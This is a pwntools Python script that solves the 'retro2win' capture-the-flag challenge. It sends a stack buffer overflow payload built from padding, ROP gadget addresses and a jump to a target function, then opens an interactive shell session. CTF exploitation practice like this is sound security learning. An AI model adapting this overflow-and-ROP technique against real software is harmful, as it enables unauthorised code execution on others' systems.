from pwn import *

context.clear(terminal = ['tmux', 'splitw', '-fh'])

p = process('./retro2win')
#p = gdb.debug('./retro2win', gdbscript='b enter_cheatcode')
#p = remote('retro2win.ctf.intigriti.io', 1338)

print(p.recvuntil(b':').decode())

print(1337)
p.sendline(b'1337')

print(p.recvuntil(b':').decode())

payload = b'A'*16
payload += b'B'*8
payload += p64(0x4009b1)
payload += b'B' * 8
payload += b'C' * 8
payload += p64(0x4009b3)
payload += b'#' * 8
payload += p64(0x400736)

print(payload)
p.sendline(payload)

print(p.readline().decode())

p.interactive()
